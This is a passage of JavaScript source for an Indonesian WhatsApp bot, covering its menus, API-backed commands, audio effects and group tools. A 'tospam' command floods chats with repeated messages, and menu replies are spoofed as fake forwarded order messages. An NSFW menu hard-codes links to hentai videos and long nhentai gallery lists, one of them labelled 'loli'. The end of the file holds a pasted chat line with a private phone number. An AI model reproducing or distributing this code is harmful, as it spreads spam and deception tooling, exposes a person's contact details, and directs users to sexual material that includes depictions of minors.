▢ ${yuz}${prefix}ssweb${yuz}
▢ ${yuz}${prefix}dog${yuz}
▢ ${yuz}${prefix}cat${yuz}
▢ ${yuz}${prefix}panda${yuz}
▢ ${yuz}${prefix}panda1${yuz}
▢ ${yuz}${prefix}bird${yuz}
▢ ${yuz}${prefix}phcoment${yuz}
▢ ${yuz}${prefix}nulis${yuz}
▢ ${yuz}${prefix}shortener${yuz}
▢ ${yuz}${prefix}urlshort${yuz}
▢ ${yuz}${prefix}memeindo${yuz}
▢ ${yuz}${prefix}darkjokes${yuz}
▢ ${yuz}${prefix}jadwalsholat${yuz}
▢ ${yuz}${prefix}cuaca${yuz}
▢ ${yuz}${prefix}stalkig${yuz}
▢ ${yuz}${prefix}quran${yuz}
▢ ${yuz}${prefix}estetikpic${yuz}
▢ ${yuz}${prefix}resepmasakan${yuz}
▢ ${yuz}${prefix}barcode${yuz}
▢ ${yuz}${prefix}cersex${yuz}
▢ ${yuz}${prefix}cerpen${yuz}
▢ ${yuz}${prefix}tongue${yuz}
▢ ${yuz}${prefix}artijadian${yuz}
▢ ${yuz}${prefix}chord${yuz}
▢ ${yuz}${prefix}lirik${yuz}
▢ ${yuz}${prefix}pinterest${yuz}
▢ ${yuz}${prefix}artinama${yuz}
▢ ${yuz}${prefix}artimimpi${yuz}
▢ ${yuz}${prefix}wikiid${yuz}
▢ ${yuz}${prefix}wikien${yuz}
▢ ${yuz}${prefix}covidid${yuz}
▢ ${yuz}${prefix}kbbi${yuz}
▢ ${yuz}${prefix}infogempa${yuz}
▢ ${yuz}${prefix}tebakgambar${yuz}
▢ ${yuz}${prefix}quotesnime${yuz}
▢ ${yuz}${prefix}lazimedia${yuz}
▢ ${yuz}${prefix}covid${yuz}

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz}`
				hypermod.sendMessage(from, menurandom, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
				case 'toolsmenu':
				case 'menutools':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menutools = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}toimg${yuz}
▢ ${yuz}${prefix}tomp3${yuz}「 _reply video_ 」
▢ ${yuz}${prefix}tomp4${yuz} 「 _reply sticker gif_ 」
▢ ${yuz}${prefix}robot${yuz} 「 _reply audio_ 」
▢ ${yuz}${prefix}balik${yuz} 「 _reply audio_ 」
▢ ${yuz}${prefix}gemuk${yuz} 「 _reply audio_ 」
▢ ${yuz}${prefix}detikvn${yuz} 「 _reply audio caption angka_ 」
▢ ${yuz}${prefix}detikvideo${yuz} 「 _reply video caption angka_ 」

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menutools, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
                case 'nsfwmenu':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menutools = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}nezuko${yuz}
▢ ${yuz}${prefix}boruto${yuz}
▢ ${yuz}${prefix}rimuru${yuz}
▢ ${yuz}${prefix}eren${yuz}
▢ ${yuz}${prefix}sagiri${yuz}
▢ ${yuz}${prefix}eren${yuz}
▢ ${yuz}${prefix}karakter${yuz} 「 _nama karakter anime_ 」
▢ ${yuz}${prefix}linkbok3p${yuz} 「 _no vpn_ 」
▢ ${yuz}${prefix}kodenuklir${yuz}
▢ ${yuz}${prefix}nekopoi1${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi2${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi3${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi4${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi5${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi6${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi7${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi8${yuz} 「 _kayaknya perlu vpn_ 」
▢ ${yuz}${prefix}nekopoi9${yuz} 「 _kayaknya perlu vpn_ 」

「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz}`
				hypermod.sendMessage(from, menutools, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break
				case 'soundmenu':
				case 'menusound':
				try {
				             pporang = await hypermod.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
				} catch {
					          pporang = 'https://i.pinimg.com/originals/87/db/f5/87dbf52f353af29b2cbc3896b590c76c.jpg'
				}
				fcrew = await getBuffer(pporang)
				var menusound = `▷\`\`\`Nama : ${pushname}\`\`\`
▷\`\`\`Jam : ${jmn}\`\`\`
▷\`\`\`Hari : ${week} ${weton}\`\`\`
▷\`\`\`Tanggal : ${calender}\`\`\`

▢ ${yuz}${prefix}hypers1${yuz}
▢ ${yuz}${prefix}hypers2${yuz}
▢ ${yuz}${prefix}sound1${yuz}
▢ ${yuz}${prefix}sound2${yuz}
▢ ${yuz}${prefix}sound3${yuz}
▢ ${yuz}${prefix}sound4${yuz}
▢ ${yuz}${prefix}sound5${yuz}
▢ ${yuz}${prefix}sound6${yuz}
▢ ${yuz}${prefix}sound7${yuz}
▢ ${yuz}${prefix}sound8${yuz}
▢ ${yuz}${prefix}sound9${yuz}
▢ ${yuz}${prefix}sound10${yuz}
▢ ${yuz}${prefix}sound11${yuz}
▢ ${yuz}${prefix}sound12${yuz}
▢ ${yuz}${prefix}sound13${yuz}
▢ ${yuz}${prefix}sound14${yuz}
▢ ${yuz}${prefix}sound15${yuz}
▢ ${yuz}${prefix}sound16${yuz}
▢ ${yuz}${prefix}sound17${yuz}
▢ ${yuz}${prefix}sound18${yuz}
▢ ${yuz}${prefix}sound19${yuz}
▢ ${yuz}${prefix}sound20${yuz}
▢ ${yuz}${prefix}sound21${yuz}
▢ ${yuz}${prefix}sound22${yuz}
▢ ${yuz}${prefix}sound23${yuz}
▢ ${yuz}${prefix}sound24${yuz}
▢ ${yuz}${prefix}sound25${yuz}

▢ ${yuz}${prefix}sound${yuz}
「 _Ga Punya Apikey?_ 」
▢Langsung ke ${yuz}${prefix}beliapi${yuz}
▢Mau request fitur/bug ${yuz}${prefix}request${yuz} `
				hypermod.sendMessage(from, menusound, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})}, message: { orderMessage: { itemCount: 0000000000, status: 200, thumbnail: fcrew, surface: 200, message: `${tampilUcapan} ${pushname}\n⎇ ${command}`, orderTitle: ``, sellerJid: '0@s.whatsapp.net'}}}, contextInfo: { forwardingScore: 508, isForwarded: true}})
				break	
				case 'translate':
				if (args.length < 1) return reply('Teksnya?')
				crew = body.slice(11)
trans = crew.split("|")[0];
late = crew.split("|")[1];
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/translate?lang=${trans}&text=${late}&apikey=${HunterApi}`, {method: 'get'})
				teks = anu.text
reply(teks)
break
				case 'delttt':
if (!isGroup) return reply(mess.only.group)
if (!isTTT) return reply('Tidak Ada Permainan Di Grub Ini')
reply(mess.wait)
laa = nana.filter(toek => !toek.id.includes(from)) 
nana = laa
reply('Sukses Gan')
break
case 'artimimpi':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/artimimpi?q=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
				case 'kalkulator':
				if (args.length < 1) return reply('Angkanya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/calculator?angka=${body.slice(12)}&apikey=${HunterApi}`, {method: 'get'})
teks = `${anu.result}`
reply(teks)
break
				case 'fancytext':
				if (args.length < 1) return reply('Teksnya?')
anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/fancytext?text=${body.slice(11)}&apikey=${HunterApi}`, {method: 'get'})
teks = anu.result
reply(teks)
break
case 'gcanime':
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length < 1) return reply('NAMA GCNYA?')
              reply('PROSES TOD')
                tessgc = await getBuffer(`https://i.pinimg.com/originals/69/0b/4a/690b4a2b92805976d284aa47bcee3a44.jpg`)
                   hypermod.updateProfilePicture (from, tessgc)
                   await sleep(1000)
                hypermod.groupUpdateSubject(from, `${body.slice(8)}`)
                await sleep(1000)
                hypermod.sendMessage(from, 'Asik Gw Jadi VVibu:v', text, {quoted: mek})
					break
case 'lirik2':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(7)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/music/liriklagu?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'bilangangka':
				if (args.length < 1) return reply('Angkanya?')
				var teks = body.slice(13)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/bilangangka?angka=${teks}&apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'pantun':
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pantun?apikey=${HunterApi}`, {method: 'get'})
				kata = anu.result
				reply(kata)
				break
				case 'resepmasakan':
				if (args.length < 1) return reply('Judulnya?')
				var teks = body.slice(14)
				anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/resepmakanan?query=${teks}&apikey=${HunterApi}`, {method: 'get'})
					hasilresep = `❏ *${anu.results.title}*\n\n❏ Porsi : ${anu.results.servings}\n❏ Waktu : ${anu.results.times}\n❏ Kesulitan : ${anu.results.dificulty}\n❏ Pengguna : ${anu.results.author.user}\n❏ Tanggal Diterbitkan : ${anu.results.author.datePublished}\n❏ Deskripsi : ${anu.results.desc}\n\n────────────────────\n❏ *Tutorial*\n\n❏ Bahan : ${anu.results.ingredient}\n❏ Langkah : ${anu.results.step}`
					reply(mess.wait)
					buff = await getBuffer(anu.results.thumb)
					hypermod.sendMessage(from, buff, image, {quoted: mek, caption: hasilresep})
					break 
					case 'githubstalk':
					if (args.length < 1) return reply('Usernamenya?')
					var teks = body.slice(13)
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/stalk/github?user=${teks}&apikey=${HunterApi}`, {method: 'get'})
					gstalk = `❏ *GITHUB STALK*\n\n❏ Name : ${anu.result.name}\n❏ Followers : ${anu.result.followers}\n❏ Following : ${anu.result.following}\n❏ Id : ${anu.result.id}\n❏ Node Id : ${anu.result.node_id}\n❏ Type : ${anu.result.type}\n❏ Company : ${anu.result.company}\n❏ Location : ${anu.result.location}\n❏ Bio : ${anu.result.bio}\n❏ Site Admin : ${anu.result.site_admin}\n❏ Email : ${anu.result.email}\n❏ Created At : ${anu.result.created_at}\n❏ Updated At : ${anu.result.updated_at}\n❏ Twitter Username : ${anu.result.twitter_username}\n❏ Blog : ${anu.result.blog}\n❏ Avatar Url : ${anu.result.avatar_url}\n❏ Gravatar Id : ${anu.result.gravatar_id}\n❏ Html Url : ${anu.result.html_url}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.avatar_url)
					hypermod.sendMessage(from, buff, image, {quoted: mek, caption: gstalk})
					break 
					case 'infogempa':
					anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/info/gempa?apikey=${HunterApi}`, {method: 'get'})
					gempa = `❏ *INFO GEMPA*\n\n❏ Waktu : ${anu.result.Waktu}\n❏ Lintang : ${anu.result.Lintang}\n❏ Bujur : ${anu.result.Bujur}\n❏ Magnitudo : ${anu.result.Magnitudo}\n❏ Kedalaman : ${anu.result.Kedalaman}\n❏ Wilayah : ${anu.result.Wilayah}`
					reply(mess.wait)
					buff = await getBuffer(anu.result.Map)
					hypermod.sendMessage(from, buff, image, {quoted: mek, caption: gempa})
					break 
				case 'dadu':
			ranp = getRandom('.png')
			rano = getRandom('.webp')
		        random = `${Math.floor(Math.random() * 6)}`
                    hasil = 'https://www.random.org/dice/dice' + random + '.png'
			exec(`wget ${hasil} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
			fs.unlinkSync(ranp)
			if (err) return reply(mess.error.api)
			buffer = fs.readFileSync(rano)
			hypermod.sendMessage(from, buffer, sticker, {quoted: mek})
			fs.unlinkSync(rano)
			})
			break
				case 'robot':
encmedial = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
medial = await hypermod.downloadAndSaveMediaMessage(encmedial)
ran = getRandom('.mp3')
exec(`ffmpeg -i ${medial} -filter_complex "afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(medial)
if (err) return reply(mess.error.api)
hah = fs.readFileSync(ran)
hypermod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt:true, quoted: mek})
fs.unlinkSync(ran)
})
break
case 'gemuk':
					encmediaz = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaz = await hypermod.downloadAndSaveMediaMessage(encmediaz)
					ran = getRandom('.mp3')
					exec(`ffmpeg -i ${mediaz} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
						fs.unlinkSync(mediaz)
						if (err) return ephe('Error!')
						hah = fs.readFileSync(ran)
					hypermod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt:true, duration: 999999999, quoted:mek})
						fs.unlinkSync(ran)
					})
					break
case 'balik':
	encmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	mediau = await hypermod.downloadAndSaveMediaMessage(encmediau)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${mediau} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(mediau)
if (err) return reply('Error!')
hah = fs.readFileSync(ran)
hypermod.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', ptt: true, duration: 999999999, quoted:mek})
fs.unlinkSync(ran)
	})
break
case 'sider':
if (!isGroup) return reply(mess.only.group)
infom = await hypermod.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
tagg = []
teks = `Telah Dibaca Oleh :\n\n`
for(let i of infom.reads){
teks += '@' + i.jid.split('@')[0] + '\n'
teks += `Waktu : ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
tagg.push(i.jid)
}
mentions(teks, tagg, true)
break
case 'tospam':
if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length > 10) {
teks = body.slice(8)
oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  hypermod.sendMessage(from, `${oi1}`, MessageType.text)
	  }
} else if (!isQuotedSticker && !isQuotedAudio && !isQuotedImage && budy.length < 10) {
teks = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  hypermod.sendMessage(from, teks, MessageType.text)
	  }
} else if (isQuotedSticker) {
	encmedian = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	         median = await hypermod.downloadAndSaveMediaMessage(encmedian)
				anu = fs.readFileSync(median)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  hypermod.sendMessage(from, anu, sticker)
	  }
} else if (isQuotedAudio) {
	encmediat = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	            mediat = await hypermod.downloadAndSaveMediaMessage(encmediat)
				anu = fs.readFileSync(mediat)
	if (!Number(args[0])) return reply('Jumlah harus berupa angka!')
	if (Number(args[0]) >= 50) return reply('Kebanyakan!')
	  for (let i = 0; i < args[0]; i++) {
	  hypermod.sendMessage(from, anu, audio, {mimetype: 'audio/mp4', duration: 999999999, ptt:true})
	  }
} else if (isQuotedImage) {
	boij = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
	delb = await hypermod.downloadMediaMessage(boij)
	teks = body.slice(6)
	oi1 = teks.split('|')[0]
oi2 = teks.split('|')[1]
if (Number(oi2) >= 50) return reply('Kebanyakan!')
	if (!Number(oi2)) return reply('Jumlah harus berupa angka!')
	  for (let i = 0; i < oi2; i++) {
	  hypermod.sendMessage(from, delb, MessageType.image, {caption: oi1})
	  }
}
	  break
//NEKOPOI BY YUZZU KAMIYAKA
                case 'linkbok3p':
                novpn = `[ *API SC* ]\n`
                    novpn += `➻ *NO VPN1* : bit.ly/2Qn9Qgu\n`
                    novpn += `➻ *NO VPN2* : bit.ly/3gWaBt8\n`
                    novpn += `➻ *XNXX VPN* : bit.ly/3vJZJ7n\n`
                    reply(novpn)
                    break
                 case 'nekopoi1':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www2.zippyshare.com/d/z9dcY6Nr/791216/%5bNekoPoi%5d_Akina_to_Onsen_de_H_Shiyo%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi2':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www4.zippyshare.com/d/j7PFLGUY/946757/%5bNekoPoi%5d_Tsuma_ga_Kirei_ni_Natta_Wake_-_02_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi3':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www111.zippyshare.com/d/EK5uqIMh/566060/%5bNekoPoi%5d_Megane_no_Megami_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi4':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www109.zippyshare.com/d/2ebALhhS/463654/%5bNekoPoi%5d_Watashi_ga_Toriko_-_02%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi5':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www115.zippyshare.com/d/LmzOkRAI/313299/%5bNekoPoi%5d_Chichi-iro_Toiki_-_01_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi6':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www89.zippyshare.com/d/SgEHvrJs/42812/%5bNekoPoi%5d_Chichi-iro_Toiki_-_02_%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi7':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www66.zippyshare.com/d/j0ivbciL/520411/%5bNekoPoi%5d_Onna_Maou_Melissa_no_H_na_Boukenki_-_01_%5b360P%5d_%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi8':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www71.zippyshare.com/d/M225YIrR/535656/%5bNekoPoi%5d_Buta_no_Gotoki_Sanzoku_ni_Torawarete_Shojo_wo_Ubawareru_Kyonyuu_Himekishi_Onna_Senshi_-_01%5b360P%5d%5bnekopoi.care%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'nekopoi9':
                 try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
                ini_buffer = await getBuffer("https://i.pinimg.com/originals/33/3d/a0/333da04b420fbd824381385e6abe248f.jpg")
                hypermod.sendMessage(from, fcrew, MessageType.image, {quoted: mek, caption: 'NIH LINKNYA: https://www49.zippyshare.com/d/bdwYjaXS/605790/%5bNekoPoi%5d_Akebi_no_Hana___Maho_-_01_%5b360P%5d_%5bnekopoi.pro%5d.mp4\n\nNOTE SIAPKAN TISU'})
                  break
                 case 'kodenuklir':
			     try {
				             pporang = 'https://i.ibb.co/ygw3X4P/120450014-395813958192355-7736109081332934145-n.jpg'
				} catch {
					          pporang = 'https://i.pinimg.com/originals/67/8a/24/678a2407f7d645c43d89f3905189c2dd.jpg'
				}
				fcrew = await getBuffer(pporang)
				var kodenuk = `Easy Mode :
• https://nhentai.net/g/316755/
• https://nhentai.net/g/316596/
• https://nhentai.net/g/311850/
• https://nhentai.net/g/315578/
• https://nhentai.net/g/315488/
• https://nhentai.net/g/315406/
• https://nhentai.net/g/315344/
• https://nhentai.net/g/315323/
• https://nhentai.net/g/315136/
• https://nhentai.net/g/315099/
Medium Mode :
• https://nhentai.net/g/316867/
• https://nhentai.net/g/316869/
• https://nhentai.net/g/316785/
• https://nhentai.net/g/316763/51/
• https://nhentai.net/g/316445/
• https://nhentai.net/g/316250/
• https://nhentai.net/g/311283/
• https://nhentai.net/g/265671/
• https://nhentai.net/g/312127/
• https://nhentai.net/g/311560/
Hard Mode :
• https://nhentai.net/g/316820/
• https://nhentai.net/g/316481/
• https://nhentai.net/g/316430/
• https://nhentai.net/g/276347/
• https://nhentai.net/g/196329/
• https://nhentai.net/g/304543/
• https://nhentai.net/g/295295/
• https://nhentai.net/g/311262/
• https://nhentai.net/g/311882/
• https://nhentai.net/g/312180/
Note : Easy mode = Sange, Biasa Aja, Mental Lemah :v
==============================
Medium Mode = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
Hard Mode = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
Kode nuklir dr milf oneesan ampe gan***** loli
https://nhentai.net/g/271890/
https://nhentai.net/g/272057/
https://nhentai.net/g/272173/
https://nhentai.net/g/272182/
https://nhentai.net/g/272196/
https://nhentai.net/g/272197/
https://nhentai.net/g/272259/
https://nhentai.net/g/272276/
https://nhentai.net/g/272290/
https://nhentai.net/g/272377/
-
https://nhentai.net/g/272390/
https://nhentai.net/g/272512/
https://nhentai.net/g/271245/
https://nhentai.net/g/271056/
https://nhentai.net/g/270809/
https://nhentai.net/g/269653/
https://nhentai.net/g/266088/
https://nhentai.net/g/264980/
https://nhentai.net/g/262215/
https://nhentai.net/g/260433/
-
https://nhentai.net/g/260146/
https://nhentai.net/g/256738/
https://nhentai.net/g/272425/
https://nhentai.net/g/272352/
https://nhentai.net/g/272045/
https://nhentai.net/g/272015/
https://nhentai.net/g/271993/
https://nhentai.net/g/271924/
https://nhentai.net/g/271905/
https://nhentai.net/g/271797/
-
https://nhentai.net/g/271760/
https://nhentai.net/g/271717/
https://nhentai.net/g/271726/
https://nhentai.net/g/271667/
https://nhentai.net/g/267352/
https://nhentai.net/g/152968/
https://nhentai.net/g/238876/
https://nhentai.net/g/116395/
https://nhentai.net/g/84809/
https://nhentai.net/g/211656/
-
https://nhentai.net/g/272117/
https://nhentai.net/g/188721/
https://nhentai.net/g/266402/
https://nhentai.net/g/238876/
[8/6 10.48] +62 812-8025-1698: Happy Mother's Day 165310,177978,211759,212643,229540, 250029,211519,256097,163478, 91505, 79280, 260629,128051,121972,261633,172044,119055,208323,149942,161236, 177150,233766,97949,230107 ,175822, 213545,232837,179166,138603,130183, 173543,234642,268015,228293,268893, 239536, yg suka mamah

Random
